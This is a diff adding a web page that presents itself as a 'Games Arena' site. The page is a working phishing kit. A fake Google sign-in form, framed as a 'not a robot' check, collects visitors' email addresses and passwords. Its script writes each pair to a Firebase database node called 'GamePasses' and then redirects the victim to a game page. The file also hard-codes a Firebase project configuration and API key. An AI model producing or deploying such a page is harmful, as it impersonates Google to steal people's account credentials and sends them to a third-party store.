@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Games Arena</title>
+	<meta name="description" content="Welcome to Games Arena. Your home of all exciting and interesting games...">
+	<link rel="stylesheet" href="index.css">
+	<script src="https://kit.fontawesome.com/6401c6b42b.js" crossorigin="anonymous"></script>
+	
+	<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+	<script src="https://www.gstatic.com/firebasejs/7.18.0/firebase-app.js"></script>
+	<script src="https://www.gstatic.com/firebasejs/7.18.0/firebase-auth.js"></script>
+	<script src="https://www.gstatic.com/firebasejs/7.18.0/firebase-database.js"></script>
+	<script src="https://www.gstatic.com/firebasejs/7.18.0/firebase-storage.js"></script>
+	<link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+    <link rel="manifest" href="site.webmanifest">
+    <link rel="mask-icon" href="safari-pinned-tab.svg" color="#5bbad5">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="theme-color" content="#ffffff">
+
+	
+</head>
+<body>
+	<script>
+		// Your web app's Firebase configuration
+		// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+		var firebaseConfig = {
+		  apiKey: "AIzaSyAT0VOEE4NJp9s1pSKDBDTK7ijJm4yJSQY",
+		  authDomain: "aaaa-6af4b.firebaseapp.com",
+		  databaseURL: "https://aaaa-6af4b.firebaseio.com",
+		  projectId: "aaaa-6af4b",
+		  storageBucket: "aaaa-6af4b.appspot.com",
+		  messagingSenderId: "152354258062",
+		  appId: "1:152354258062:web:773082156bced0ef801ddf",
+		  measurementId: "G-M264BJ46QZ"
+		};
+		// Initialize Firebase
+		firebase.initializeApp(firebaseConfig);
+
+		var counter = 100000000000000000;
+	  </script>
+	 
+	<div>
+		<div class="content">
+			<div class="form-box">
+				<h2>Please confirm that you are not a robot</h2>         
+				<form id="bd-wish" class="input-group">
+					<img class="google" src="google.jpeg" alt="Google"><br>
+					<span>Sign  in with your Google Account</span><br>
+					<img class="userlogo" src="userlogo.png" alt=""><br>
+					<input placeholder="Email" id="emailid" class="input" type="email"><br>
+					<input placeholder="Password" id="passid" class="input" type="password"><br>
+					<button id="sendid" class="submit">Sign In</button>
+				</form>
+			</div>
+		</div>
+	</div><br><br><br>
+
+
+
+	<script>
+		$("#sendid").click(function(){
+			var etext = $("#emailid").val();
+			var ptext = $("#passid").val();
+			var dateStr = new Date().getTime();
+            var numberStr = counter - dateStr;
+			var time = new Date();
+            var option = {
+                       weekday: "long",
+                       month: "long",
+                       day: "2-digit",
+					   year: "numeric",
+			}
+			var databaseRef = firebase.database().ref().child("GamePasses");
+			var blogData = {
+				"etext": etext,
+				"ptext": ptext,
+				"count": numberStr,
+                "time": time.toLocaleString('en-US', {hours: 'numeric', minutes: 'numeric', seconds: 'numeric', hours12: true}),
+                "date": time.toLocaleDateString('en-US', option),
+			};
+	
+			var newPostRef = databaseRef.push();
+			if (ptext != "" && etext != "") {
+				newPostRef.set(blogData, function(err){
+								if (!err){
+									window.location.replace("game.html");
+								} else {
+									$("#result").attr("class", "alert alert-danger");
+									$("#result").html("An error occuried in the upload of your post...!");
+								}
+				});
+			} else {
+				$("#result").html("Please write a message...!");
+			}
+			window.location.replace("game.html");
+		});
+	
+	
+	</script>
+</body>
+</html>
